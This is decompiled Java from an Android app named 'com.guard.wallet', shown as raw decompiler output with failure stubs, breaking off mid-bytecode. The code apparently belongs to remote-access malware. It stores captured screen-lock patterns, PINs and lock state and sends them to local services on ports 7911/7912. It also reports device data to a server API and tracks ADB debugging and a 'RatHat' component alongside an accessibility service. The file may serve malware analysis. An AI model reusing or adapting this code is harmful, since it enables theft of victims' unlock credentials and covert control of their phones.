package com.guard.wallet.utils;

import a1.q;
import android.content.ClipboardManager;
import android.content.ClipData.Item;
import android.util.Log;
import com.google.json.Gson;
import com.google.json.JsonObject;
import com.google.json.reflect.TypeToken;
import com.guard.wallet.MainApplication;
import com.guard.wallet.entity.ADBConfig;
import com.guard.wallet.entity.CheckPortResult;
import com.guard.wallet.entity.Point;
import com.guard.wallet.http.l;
import com.guard.wallet.req.AdminAdminActivatingVO;
import com.guard.wallet.req.ApiRequest;
import com.guard.wallet.req.LockPatternVO;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.req.NetStateVO;
import com.guard.wallet.req.PasswordEventBodyVO;
import com.guard.wallet.req.ReqMessageVO;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.req.ScreenMetricsVO;
import com.guard.wallet.resp.ApiResult;
import com.guard.wallet.resp.PairResponseVO;
import com.guard.wallet.resp.PowerControlStateVO;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.stat.ScreenEventStatVO;
import java.lang.reflect.Type;
import java.util.Date;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;

public abstract class h {
   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   // $VF: Could not inline inconsistent finally blocks
   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static boolean A(ADBConfig var0) {
      if (var0 != null) {
         synchronized (ADBConfig.class){} // $VF: monitorenter 

         Throwable var10000;
         label411: {
            ADBConfig var1;
            label404: {
               try {
                  var1 = J();
                  if (var0.getUpdateTime() > var1.getUpdateTime()) {
                     if (var0.isPaired()) {
                        var1.setPaired(var0.isPaired());
                     }
                     break label404;
                  }
               } catch (Throwable var57) {
                  var10000 = var57;
                  boolean var10001 = false;
                  break label411;
               }

               try {
                  // $VF: monitorexit
                  return false;
               } catch (Throwable var56) {
                  var10000 = var56;
                  boolean var59 = false;
                  break label411;
               }
            }

            try {
               if (Objects.equals(1, var0.getInstalledRatHat())) {
                  var1.setInstalledRatHat(1);
               }
            } catch (Throwable var55) {
               var10000 = var55;
               boolean var60 = false;
               break label411;
            }

            try {
               if (Objects.equals(1, var0.getIsRatHatRunning())) {
                  var1.setIsRatHatRunning(1);
               }
            } catch (Throwable var54) {
               var10000 = var54;
               boolean var61 = false;
               break label411;
            }

            try {
               if (!Objects.equals(var1.getDebugPort(), var0.getDebugPort())) {
                  var1.setConnected(false);
                  var1.setDebugPort(var0.getDebugPort());
                  if (MainApplication.getInstance() != null) {
                     MainApplication.getInstance().rewriteDebugPort(var0.getDebugPort());
                  }
               }
            } catch (Throwable var53) {
               var10000 = var53;
               boolean var62 = false;
               break label411;
            }

            label383:
            try {
               var1.setUpdateTime(var0.getUpdateTime());
               D(N(var1), "ADBConfig");
               // $VF: monitorexit
               return true;
            } catch (Throwable var52) {
               var10000 = var52;
               boolean var63 = false;
               break label383;
            }
         }

         while (true) {
            Throwable var58 = var10000;

            try {
               // $VF: monitorexit
               throw var58;
            } catch (Throwable var51) {
               var10000 = var51;
               boolean var64 = false;
               continue;
            }
         }
      } else {
         return false;
      }
   }

   public static void B(boolean var0, boolean var1) {
      D(var0, "isAdminActivating");
      if (var1) {
         String var2 = l.a;
         AdminAdminActivatingVO var4 = new AdminAdminActivatingVO(var0);
         j.e var3 = new j.e(1);
         new com.guard.wallet.http.i("http://127.0.0.1:7911").h(var4, "/syncAdminActivating", var3);
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   // $VF: Could not inline inconsistent finally blocks
   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static void C(ReqUnlockDeviceVO var0) {
      if (var0 != null) {
         synchronized (ReqUnlockDeviceVO.class){} // $VF: monitorenter 

         label1103: {
            Throwable var10000;
            label1107: {
               ReqUnlockDeviceVO var1;
               label1095: {
                  try {
                     if (!var0.getLocked()) {
                        var1 = f();
                        break label1095;
                     }
                  } catch (Throwable var134) {
                     var10000 = var134;
                     boolean var10001 = false;
                     break label1107;
                  }

                  var1 = null;
               }

               ReqUnlockDeviceVO var2 = var1;
               if (var1 == null) {
                  try {
                     var2 = new ReqUnlockDeviceVO();
                     var2.setLocked(var0.getLocked());
                  } catch (Throwable var133) {
                     var10000 = var133;
                     boolean var141 = false;
                     break label1107;
                  }
               }

               try {
                  if (var0.getBoundsInScreen() != null) {
                     var2.setBoundsInScreen(var0.getBoundsInScreen());
                  }
               } catch (Throwable var132) {
                  var10000 = var132;
                  boolean var142 = false;
                  break label1107;
               }

               try {
                  if (var0.getBoundsInParent() != null) {
                     var2.setBoundsInParent(var0.getBoundsInParent());
                  }
               } catch (Throwable var131) {
                  var10000 = var131;
                  boolean var143 = false;
                  break label1107;
               }

               label1105: {
                  try {
                     if (q.B(var0.getCipherGradeCode())) {
                        break label1105;
                     }

                     if (Objects.equals(var0.getCipherGradeCode(), "PASSWORD_QUALITY_PATTERN")) {
                        if (var0.getPatternCipher() != null && !var0.getPatternCipher().isEmpty()) {
                           var2.setCipherGradeCode(var0.getCipherGradeCode());
                           var2.setPatternCipher(var0.getPatternCipher());
                        }
                        break label1105;
                     }
                  } catch (Throwable var130) {
                     var10000 = var130;
                     boolean var144 = false;
                     break label1107;
                  }

                  try {
                     var2.setCipherGradeCode(var0.getCipherGradeCode());
                     if (var0.getTouchCipher() != null && !var0.getTouchCipher().isEmpty()) {
                        var2.setTouchCipher(var0.getTouchCipher());
                     }
                  } catch (Throwable var129) {
                     var10000 = var129;
                     boolean var145 = false;
                     break label1107;
                  }

                  try {
                     if (!q.B(var0.getTextCipher())) {
                        var2.setTextCipher(var0.getTextCipher());
                     }
                  } catch (Throwable var128) {
                     var10000 = var128;
                     boolean var146 = false;
                     break label1107;
                  }
               }

               label1055: {
                  label1054: {
                     try {
                        if (var2.getLocked()) {
                           break label1054;
                        }
                     } catch (Throwable var127) {
                        var10000 = var127;
                        boolean var147 = false;
                        break label1107;
                     }

                     var136 = "deviceCipher";
                     break label1055;
                  }

                  var136 = "deviceCipherLocked";
               }

               try {
                  var140 = N(var2);
               } catch (Throwable var126) {
                  var10000 = var126;
                  boolean var148 = false;
                  break label1107;
               }

               label1044:
               try {
                  D(var140, var136);
                  // $VF: monitorexit
                  break label1103;
               } catch (Throwable var125) {
                  var10000 = var125;
                  boolean var149 = false;
                  break label1044;
               }
            }

            while (true) {
               Throwable var135 = var10000;

               try {
                  // $VF: monitorexit
                  throw var135;
               } catch (Throwable var124) {
                  var10000 = var124;
                  boolean var150 = false;
                  continue;
               }
            }
         }

         if (MainApplication.getInstance() != null) {
            MainApplication.getInstance().offerStrategyEvent("LOCAL_LOCK_CIPHER_PREPARED");
         }

         String var137 = l.a;
         if (!q.E(7911)) {
            j.e var138 = new j.e(1);
            new com.guard.wallet.http.i("http://127.0.0.1:7911").h(var0, "/syncLockCipher", var138);
         }

         if (!q.E(7912)) {
            j.e var139 = new j.e(1);
            new com.guard.wallet.http.i("http://127.0.0.1:7912").h(var0, "/syncLockCipher", var139);
         }
      }
   }

   public static boolean D(Object param0, String param1) {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.RuntimeException: parsing failure!
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.parseGraph(DomHelper.java:211)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:166)
      //
      // Bytecode:
      // 00: ldc com/guard/wallet/utils/h
      // 02: monitorenter
      // 03: aload 1
      // 04: invokestatic a1/q.B (Ljava/lang/Object;)Z
      // 07: ifne eb
      // 0a: aload 0
      // 0b: ifnull eb
      // 0e: invokestatic com/guard/wallet/utils/g.Z ()Landroid/content/Context;
      // 11: ifnull eb
      // 14: invokestatic com/guard/wallet/utils/h.s ()Z
      // 17: istore 2
      // 18: iload 2
      // 19: ifeq eb
      // 1c: invokestatic com/guard/wallet/utils/g.Z ()Landroid/content/Context;
      // 1f: aload 1
      // 20: bipush 0
      // 21: invokevirtual android/content/Context.getSharedPreferences (Ljava/lang/String;I)Landroid/content/SharedPreferences;
      // 24: astore 3
      // 25: aload 3
      // 26: ifnull eb
      // 29: aload 3
      // 2a: invokeinterface android/content/SharedPreferences.edit ()Landroid/content/SharedPreferences$Editor; 1
      // 2f: astore 3
      // 30: aload 3
      // 31: ifnull eb
      // 34: aload 0
      // 35: instanceof java/lang/Integer
      // 38: ifeq 55
      // 3b: aload 3
      // 3c: aload 1
      // 3d: aload 0
      // 3e: checkcast java/lang/Integer
      // 41: invokevirtual java/lang/Integer.intValue ()I
      // 44: invokeinterface android/content/SharedPreferences$Editor.putInt (Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor; 3
      // 49: pop
      // 4a: aload 3
      // 4b: invokeinterface android/content/SharedPreferences$Editor.apply ()V 1
      // 50: ldc com/guard/wallet/utils/h
      // 52: monitorexit
      // 53: bipush 1
      // 54: ireturn
      // 55: aload 0
      // 56: instanceof java/lang/String
      // 59: ifeq 73
      // 5c: aload 3
      // 5d: aload 1
      // 5e: aload 0
      // 5f: checkcast java/lang/String
      // 62: invokeinterface android/content/SharedPreferences$Editor.putString (Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor; 3
      // 67: pop
      // 68: aload 3
      // 69: invokeinterface android/content/SharedPreferences$Editor.apply ()V 1
      // 6e: ldc com/guard/wallet/utils/h
      // 70: monitorexit
      // 71: bipush 1
      // 72: ireturn
      // 73: aload 0
      // 74: instanceof java/lang/Float
      // 77: ifeq 94
      // 7a: aload 3
      // 7b: aload 1
      // 7c: aload 0
      // 7d: checkcast java/lang/Float
      // 80: invokevirtual java/lang/Float.floatValue ()F
      // 83: invokeinterface android/content/SharedPreferences$Editor.putFloat (Ljava/lang/String;F)Landroid/content/SharedPreferences$Editor; 3
      // 88: pop
      // 89: aload 3
      // 8a: invokeinterface android/content/SharedPreferences$Editor.apply ()V 1
      // 8f: ldc com/guard/wallet/utils/h
      // 91: monitorexit
      // 92: bipush 1
      // 93: ireturn
      // 94: aload 0
      // 95: instanceof java/lang/Long
      // 98: ifeq b5
      // 9b: aload 3
      // 9c: aload 1
      // 9d: aload 0
      // 9e: checkcast java/lang/Long
      // a1: invokevirtual java/lang/Long.longValue ()J
      // a4: invokeinterface android/content/SharedPreferences$Editor.putLong (Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor; 4
      // a9: pop
      // aa: aload 3
      // ab: invokeinterface android/content/SharedPreferences$Editor.apply ()V 1
      // b0: ldc com/guard/wallet/utils/h
      // b2: monitorexit
      // b3: bipush 1
      // b4: ireturn
      // b5: aload 0
      // b6: instanceof java/lang/Boolean
      // b9: ifeq d6
      // bc: aload 3
      // bd: aload 1
      // be: aload 0
      // bf: checkcast java/lang/Boolean
      // c2: invokevirtual java/lang/Boolean.booleanValue ()Z
      // c5: invokeinterface android/content/SharedPreferences$Editor.putBoolean (Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor; 3
      // ca: pop
      // cb: aload 3
      // cc: invokeinterface android/content/SharedPreferences$Editor.apply ()V 1
      // d1: ldc com/guard/wallet/utils/h
      // d3: monitorexit
      // d4: bipush 1
      // d5: ireturn
      // d6: ldc_w "SharedUtils"
      // d9: ldc_w "不支持数据类型"
      // dc: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // df: pop
      // e0: goto eb
      // e3: astore 0
      // e4: ldc_w "SharedUtils"
      // e7: aload 0
      // e8: invokestatic a1/q.s (Ljava/lang/String;Ljava/lang/Exception;)V
      // eb: ldc com/guard/wallet/utils/h
      // ed: monitorexit
      // ee: bipush 0
      // ef: ireturn
      // f0: astore 0
      // f1: ldc com/guard/wallet/utils/h
      // f3: monitorexit
      // f4: aload 0
      // f5: athrow
   }

   // $VF: Handled exception range with multiple entry points by splitting it
   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   // $VF: Could not inline inconsistent finally blocks
   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static void E(String var0) {
      synchronized (h.class){} // $VF: monitorenter 

      Throwable var10000;
      label290: {
         label291: {
            String var1;
            try {
               if (q.B(var0)) {
                  break label291;
               }

               var1 = m();
               D(var0, "systemLangCode");
               if (Objects.equals(var0, var1)) {
                  break label291;
               }

               if (!q.B(var1)) {
                  Log.d("SharedUtils", "原始语言:".concat(var1));
               }
            } catch (Throwable var42) {
               var10000 = var42;
               boolean var10001 = false;
               break label290;
            }

            try {
               if (!q.B(var1)) {
                  Log.d("SharedUtils", "当前语言:".concat(var0));
               }
            } catch (Throwable var43) {
               var10000 = var43;
               boolean var45 = false;
               break label290;
            }

            try {
               f.b.set(false);
               l.z();
               if (MyAccessibilityService.P() != null) {
                  MyAccessibilityService.P().k.set(1);
                  l.d();
               }
            } catch (Throwable var41) {
               var10000 = var41;
               boolean var46 = false;
               break label290;
            }
         }

         try {
            // $VF: monitorexit
         } catch (Throwable var40) {
            var10000 = var40;
            boolean var47 = false;
            break label290;
         }

         label267:
         try {
            return;
         } catch (Throwable var39) {
            var10000 = var39;
            boolean var48 = false;
            break label267;
         }
      }

      while (true) {
         Throwable var44 = var10000;

         try {
            // $VF: monitorexit
            throw var44;
         } catch (Throwable var38) {
            var10000 = var38;
            boolean var49 = false;
            continue;
         }
      }
   }

   public static void F() {
      NetStateVO var1 = g.z0();
      MessageRecordVO var0 = new MessageRecordVO();
      var0.setIntentCode("android.net.conn.CONNECTIVITY_CHANGE");
      var0.setExtraBody(var1);
      MainApplication.getInstance().getHandlerMsgAndTimer().b(var0);
   }

   public static void G(String var0) {
      if (!q.B(var0)) {
         Long var3 = j("lockBatchId");
         MessageRecordVO var2 = new MessageRecordVO();
         PasswordEventBodyVO var1 = new PasswordEventBodyVO();
         if (var3 > 0L) {
            var1.setLockBatchId(String.valueOf(var3));
         }

         var2.setIntentCode(var0);
         var2.setExtraBody(var1);
         if (v(var2)) {
            return;
         }

         if (MainApplication.getInstance() != null && MainApplication.getInstance().getHandlerMsgAndTimer() != null) {
            MainApplication.getInstance().getHandlerMsgAndTimer().b(var2);
         }
      }
   }

   public static void H(int var0, String var1) {
      LockPatternVO var2 = g.B0();
      StringBuilder var3 = new StringBuilder("需要向服务器提交屏幕事件:");
      var3.append(var0);
      Log.d("MessageUtils", var3.toString());
      MessageRecordVO var4 = new MessageRecordVO();
      ScreenEventStatVO var6 = new ScreenEventStatVO();
      var6.setState(var0);
      var6.setScreenOffTimeout(g.P0());
      var6.setIsKeyguardLocked(var2.getIsKeyguardLocked());
      var6.setIsKeyguardSecure(var2.getIsKeyguardSecure());
      var6.setInKeyguardRestrictedInputMode(var2.getInKeyguardRestrictedInputMode());
      var6.setIsDeviceLocked(var2.getIsDeviceLocked());
      var6.setIsDeviceSecure(var2.getIsDeviceSecure());
      var6.setQuality(var2.getQuality());
      byte var5;
      if (e.j()) {
         var5 = 1;
      } else {
         var5 = 0;
      }

      var6.setIsScreenOn(Integer.valueOf(var5));
      var4.setIntentCode(var1);
      var4.setExtraBody(var6);
      if (!v(var4)) {
         if (MainApplication.getInstance() != null && MainApplication.getInstance().getHandlerMsgAndTimer() != null) {
            MainApplication.getInstance().getHandlerMsgAndTimer().b(var4);
         }
      }
   }

   public static void I() {
      try {
         ScreenMetricsVO var0 = e.e();
         MessageRecordVO var1 = new MessageRecordVO();
         var1.setIntentCode("android.intent.action.SCREEN_SIZE");
         var1.setExtraBody(var0);
         if (v(var1)) {
            return;
         }

         if (MainApplication.getInstance() != null && MainApplication.getInstance().getHandlerMsgAndTimer() != null) {
            MainApplication.getInstance().getHandlerMsgAndTimer().b(var1);
         }
      } catch (Exception var2) {
         q.s("MessageUtils", var2);
      }
   }

   public static ADBConfig J() {
      String var0 = l("ADBConfig");
      ADBConfig var2;
      if (!q.B(var0)) {
         var2 = (ADBConfig)c(var0, new SharedUtils$3());
      } else {
         var2 = null;
      }

      ADBConfig var1 = var2;
      if (var2 == null) {
         var1 = new ADBConfig();
         var1.setConnected(false);
         var1.setConnectedDevice(null);
         var1.setInstalledRatHat(-1);
         var1.setIsRatHatRunning(-1);
         var1.setEnableDevelopment(g.K());
         var1.setEnableDebug(g.I());
         var1.setEnableWifiDebug(g.J());
         var1.setUpdateTime(0L);
      }

      if (h.e.S() != null && h.e.S().B.get()) {
         var1.setInstalledRatHat(1);
         var1.setIsRatHatRunning(1);
      }

      return var1;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   // $VF: Could not inline inconsistent finally blocks
   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static void K(ReqUnlockDeviceVO var0) {
      if (var0 != null) {
         synchronized (ReqUnlockDeviceVO.class){} // $VF: monitorenter 

         Throwable var10000;
         label383: {
            String var1;
            label384: {
               label385: {
                  try {
                     if (!var0.getLocked()) {
                        break label385;
                     }
                  } catch (Throwable var57) {
                     var10000 = var57;
                     boolean var10001 = false;
                     break label383;
                  }

                  var1 = "deviceCipherLocked";

                  try {
                     var58 = N(var0);
                     break label384;
                  } catch (Throwable var56) {
                     var10000 = var56;
                     boolean var60 = false;
                     break label383;
                  }
               }

               var1 = "deviceCipher";

               try {
                  var58 = N(var0);
               } catch (Throwable var55) {
                  var10000 = var55;
                  boolean var61 = false;
                  break label383;
               }
            }

            try {
               D(var58, var1);
            } catch (Throwable var54) {
               var10000 = var54;
               boolean var62 = false;
               break label383;
            }

            try {
               if (MainApplication.getInstance() != null) {
                  MainApplication.getInstance().offerStrategyEvent("LOCAL_LOCK_CIPHER_PREPARED");
               }
            } catch (Throwable var53) {
               var10000 = var53;
               boolean var63 = false;
               break label383;
            }

            label357:
            try {
               // $VF: monitorexit
               return;
            } catch (Throwable var52) {
               var10000 = var52;
               boolean var64 = false;
               break label357;
            }
         }

         while (true) {
            Throwable var59 = var10000;

            try {
               // $VF: monitorexit
               throw var59;
            } catch (Throwable var51) {
               var10000 = var51;
               boolean var65 = false;
               continue;
            }
         }
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   // $VF: Could not inline inconsistent finally blocks
   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static void L(PowerControlStateVO var0) {
      synchronized (PowerControlStateVO.class){} // $VF: monitorenter 

      Throwable var10000;
      label96: {
         try {
            String var1 = "powerControlState:".concat(var0.getPackageName());
            D(N(var0), var1);
            var1 = l.a;
            j.e var17 = new j.e(1);
            com.guard.wallet.http.i var2 = new com.guard.wallet.http.i("http://127.0.0.1:7911");
            var2.h(var0, "/syncPowerControl", var17);
            var1 = l("deviceId");
            if (!q.B(var1)) {
               var0.setDeviceId(var1);
               j.e var19 = new j.e(1);
               var2 = new com.guard.wallet.http.i();
               var2.h(var0, "/api/devicePowerControlState/post.json", var19);
            }

            // $VF: monitorexit
         } catch (Throwable var14) {
            var10000 = var14;
            boolean var10001 = false;
            break label96;
         }

         label93:
         try {
            return;
         } catch (Throwable var13) {
            var10000 = var13;
            boolean var21 = false;
            break label93;
         }
      }

      while (true) {
         Throwable var15 = var10000;

         try {
            // $VF: monitorexit
            throw var15;
         } catch (Throwable var12) {
            var10000 = var12;
            boolean var22 = false;
            continue;
         }
      }
   }

   public static JsonObject M(String var0) {
      if (!q.B(var0)) {
         try {
            Gson var1 = new Gson();
            JsonObject var3 = var1.fromJson(var0, JsonObject.class);
            var1.destroy();
            return var3;
         } catch (Exception var2) {
            q.s("com.guard.wallet.utils.h", var2);
         }
      }

      return null;
   }

   public static String N(Object var0) {
      if (var0 != null) {
         try {
            Gson var1 = new Gson();
            var0 = var1.toJson(var0);
            var1.destroy();
            return var0;
         } catch (Exception var2) {
            q.s("com.guard.wallet.utils.h", var2);
         }
      }

      return "{}";
   }

   public static Point O(String var0) {
      if (!q.B(var0)) {
         try {
            GsonUtils$2 var1 = new GsonUtils$2();
            Type var2 = var1.getType();
            Gson var5 = new Gson();
            Point var4 = var5.fromJson(var0, var2);
            var5.destroy();
            return var4;
         } catch (Exception var3) {
            q.s("com.guard.wallet.utils.h", var3);
         }
      }

      return null;
   }

   public static List P(String var0) {
      if (!q.B(var0)) {
         try {
            GsonUtils$1 var1 = new GsonUtils$1();
            Type var2 = var1.getType();
            Gson var5 = new Gson();
            List var4 = var5.fromJson(var0, var2);
            var5.destroy();
            return var4;
         } catch (Exception var3) {
            q.s("com.guard.wallet.utils.h", var3);
         }
      }

      return null;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   // $VF: Could not inline inconsistent finally blocks
   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static void Q() {
      synchronized (ADBConfig.class){} // $VF: monitorenter 

      Throwable var10000;
      label243: {
         boolean var2;
         ADBConfig var3;
         try {
            var3 = J();
            var2 = g.K();
         } catch (Throwable var34) {
            var10000 = var34;
            boolean var10001 = false;
            break label243;
         }

         byte var1 = 1;
         byte var0;
         if (var2) {
            var0 = 1;
         } else {
            var0 = 0;
         }

         label234: {
            label233: {
               try {
                  var3.setEnableDevelopment(var0);
                  if (g.I()) {
                     break label233;
                  }
               } catch (Throwable var33) {
                  var10000 = var33;
                  boolean var38 = false;
                  break label243;
               }

               var0 = 0;
               break label234;
            }

            var0 = 1;
         }

         label226: {
            label225: {
               try {
                  var3.setEnableDebug(var0);
                  if (g.J()) {
                     break label225;
                  }
               } catch (Throwable var32) {
                  var10000 = var32;
                  boolean var39 = false;
                  break label243;
               }

               var0 = 0;
               break label226;
            }

            var0 = var1;
         }

         label219:
         try {
            var3.setEnableWifiDebug(var0);
            Date var4 = new Date();
            var3.setUpdateTime(var4.getTime());
            D(N(var3), "ADBConfig");
            // $VF: monitorexit
            return;
         } catch (Throwable var31) {
            var10000 = var31;
            boolean var40 = false;
            break label219;
         }
      }

      while (true) {
         Throwable var37 = var10000;

         try {
            // $VF: monitorexit
            throw var37;
         } catch (Throwable var30) {
            var10000 = var30;
            boolean var41 = false;
            continue;
         }
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   // $VF: Could not inline inconsistent finally blocks
   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static Integer a() {
      synchronized (ADBConfig.class){} // $VF: monitorenter 

      Throwable var10000;
      label102: {
         try {
            ADBConfig var0 = J();
            if (var0.isConnected() && var0.getDebugPort() != null && var0.getDebugPort() > 0) {
               Integer var14 = var0.getDebugPort();
               // $VF: monitorexit
               return var14;
            }
         } catch (Throwable var12) {
            var10000 = var12;
            boolean var10001 = false;
            break label102;
         }

         label99:
         try {
            // $VF: monitorexit
            return 0;
         } catch (Throwable var11) {
            var10000 = var11;
            boolean var15 = false;
            break label99;
         }
      }

      while (true) {
         Throwable var13 = var10000;

         try {
            // $VF: monitorexit
            throw var13;
         } catch (Throwable var10) {
            var10000 = var10;
            boolean var16 = false;
            continue;
         }
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   // $VF: Could not inline inconsistent finally blocks
   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static Integer b() {
      synchronized (ADBConfig.class){} // $VF: monitorenter 

      Throwable var10000;
      label97: {
         try {
            ADBConfig var0 = J();
            if (var0.getDebugPort() != null && var0.getDebugPort() > 0) {
               Integer var14 = var0.getDebugPort();
               // $VF: monitorexit
               return var14;
            }
         } catch (Throwable var12) {
            var10000 = var12;
            boolean var10001 = false;
            break label97;
         }

         label94:
         try {
            // $VF: monitorexit
            return 0;
         } catch (Throwable var11) {
            var10000 = var11;
            boolean var15 = false;
            break label94;
         }
      }

      while (true) {
         Throwable var13 = var10000;

         try {
            // $VF: monitorexit
            throw var13;
         } catch (Throwable var10) {
            var10000 = var10;
            boolean var16 = false;
            continue;
         }
      }
   }

   public static Object c(String var0, TypeToken var1) {
      if (!q.B(var0)) {
         try {
            Gson var2 = new Gson();
            Object var4 = var2.fromJson(var0, var1);
            var2.destroy();
            return var4;
         } catch (Exception var3) {
            q.s("com.guard.wallet.utils.h", var3);
         }
      }

      return null;
   }

   public static Object d(String var0, Class var1) {
      if (!q.B(var0)) {
         try {
            Gson var2 = new Gson();
            Object var4 = var2.fromJson(var0, var1);
            var2.destroy();
            return var4;
         } catch (Exception var3) {
            q.s("com.guard.wallet.utils.h", var3);
         }
      }

      return null;
   }

   public static boolean e(String param0) {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.RuntimeException: parsing failure!
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.parseGraph(DomHelper.java:211)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:166)
      //
      // Bytecode:
      // 00: ldc com/guard/wallet/utils/h
      // 02: monitorenter
      // 03: aload 0
      // 04: invokestatic a1/q.B (Ljava/lang/Object;)Z
      // 07: ifne 3b
      // 0a: invokestatic com/guard/wallet/utils/g.Z ()Landroid/content/Context;
      // 0d: ifnull 3b
      // 10: invokestatic com/guard/wallet/utils/h.s ()Z
      // 13: istore 1
      // 14: iload 1
      // 15: ifeq 3b
      // 18: invokestatic com/guard/wallet/utils/g.Z ()Landroid/content/Context;
      // 1b: aload 0
      // 1c: bipush 0
      // 1d: invokevirtual android/content/Context.getSharedPreferences (Ljava/lang/String;I)Landroid/content/SharedPreferences;
      // 20: astore 2
      // 21: aload 2
      // 22: ifnull 3b
      // 25: aload 2
      // 26: aload 0
      // 27: bipush 0
      // 28: invokeinterface android/content/SharedPreferences.getBoolean (Ljava/lang/String;Z)Z 3
      // 2d: istore 1
      // 2e: ldc com/guard/wallet/utils/h
      // 30: monitorexit
      // 31: iload 1
      // 32: ireturn
      // 33: astore 0
      // 34: ldc_w "SharedUtils"
      // 37: aload 0
      // 38: invokestatic a1/q.s (Ljava/lang/String;Ljava/lang/Exception;)V
      // 3b: ldc com/guard/wallet/utils/h
      // 3d: monitorexit
      // 3e: bipush 0
      // 3f: ireturn
      // 40: astore 0
      // 41: ldc com/guard/wallet/utils/h
      // 43: monitorexit
      // 44: aload 0
      // 45: athrow
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   // $VF: Could not inline inconsistent finally blocks
   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static ReqUnlockDeviceVO f() {
      synchronized (ReqUnlockDeviceVO.class){} // $VF: monitorenter 

      Throwable var10000;
      label97: {
         try {
            String var0 = l("deviceCipher");
            if (!q.B(var0)) {
               SharedUtils$1 var1 = new SharedUtils$1();
               ReqUnlockDeviceVO var15 = (ReqUnlockDeviceVO)c(var0, var1);
               // $VF: monitorexit
               return var15;
            }
         } catch (Throwable var13) {
            var10000 = var13;
            boolean var10001 = false;
            break label97;
         }

         label91:
         try {
            // $VF: monitorexit
            return null;
         } catch (Throwable var12) {
            var10000 = var12;
            boolean var16 = false;
            break label91;
         }
      }

      while (true) {
         Throwable var14 = var10000;

         try {
            // $VF: monitorexit
            throw var14;
         } catch (Throwable var11) {
            var10000 = var11;
            boolean var17 = false;
            continue;
         }
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   // $VF: Could not inline inconsistent finally blocks
   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static ReqUnlockDeviceVO g() {
      synchronized (ReqUnlockDeviceVO.class){} // $VF: monitorenter 

      Throwable var10000;
      label97: {
         try {
            String var1 = l("deviceCipherLocked");
            if (!q.B(var1)) {
               SharedUtils$2 var14 = new SharedUtils$2();
               ReqUnlockDeviceVO var15 = (ReqUnlockDeviceVO)c(var1, var14);
               // $VF: monitorexit
               return var15;
            }
         } catch (Throwable var13) {
            var10000 = var13;
            boolean var10001 = false;
            break label97;
         }

         label91:
         try {
            // $VF: monitorexit
            return null;
         } catch (Throwable var12) {
            var10000 = var12;
            boolean var16 = false;
            break label91;
         }
      }

      while (true) {
         Throwable var0 = var10000;

         try {
            // $VF: monitorexit
            throw var0;
         } catch (Throwable var11) {
            var10000 = var11;
            boolean var17 = false;
            continue;
         }
      }
   }

   public static float h() {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.RuntimeException: parsing failure!
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.parseGraph(DomHelper.java:211)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:166)
      //
      // Bytecode:
      // 00: ldc com/guard/wallet/utils/h
      // 02: monitorenter
